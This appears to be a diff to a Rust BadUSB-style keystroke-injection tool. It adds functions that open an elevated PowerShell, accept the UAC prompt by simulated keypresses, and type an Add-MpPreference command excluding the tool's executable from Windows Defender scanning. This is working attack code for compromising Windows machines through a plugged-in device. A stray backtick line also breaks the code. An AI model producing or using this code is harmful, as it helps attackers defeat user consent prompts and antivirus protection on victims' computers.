@@ -3,6 +3,7 @@ use hidg::{Key, Result};
 
 use crate::keyboard_helper::KeyboardHelper;
 use crate::DRIVER_LETTER_VAR_NAME;
+use crate::EXE_FILE_PATH;
 
 pub struct KeySimulator<'a, 'b> {
     helper: &'a mut KeyboardHelper<'b>
@@ -13,6 +14,31 @@ impl<'a, 'b> KeySimulator<'a, 'b> {
         KeySimulator { helper }
     }
 
+    pub fn open_powershell_admin(&mut self) -> Result<()>{
+        self.helper.press_multi(&[Key::LeftMeta, Key::R])?;  // LeftMeta即Win键
+        sleep(Duration::from_millis(500));  // 睡眠一段时间，否则Windows反应不过来，不会将Win+R的窗口作为焦点
+
+        [Key::P, Key::O, Key::W, Key::E, Key::R, Key::S, Key::H, Key::E, Key::L, Key::L]
+        .into_iter().try_for_each(|key| self.helper.press_one(key))?;
+
+        self.helper.press_multi(&[Key::LeftCtrl, Key::LeftShift, Key::Enter])?;
+
+        sleep(Duration::from_millis(500));
+        self.helper.press_one(Key::Left)?;
+        self.helper.press_one(Key::Enter)?;
+
+        Ok(())
+    }
+
+    // 必须在admin状态下运行，否则会报错
+    pub fn whitelist_the_program(&mut self) -> Result<()>{
+        let whitelist_cmd = format!(
+            "Add-MpPreference -ExclusionPath '${{{DRIVER_LETTER_VAR_NAME}}}\\{EXE_FILE_PATH}'"
+        );
+        self.helper.press_line(&whitelist_cmd)?;
+        Ok(())
+    }
+``
     pub fn open_powershell(&mut self) -> Result<()> {
         self.helper.press_multi(&[Key::LeftMeta, Key::R])?;  // LeftMeta即Win键
         sleep(Duration::from_millis(500));  // 睡眠一段时间，否则Windows反应不过来，不会将Win+R的窗口作为焦点
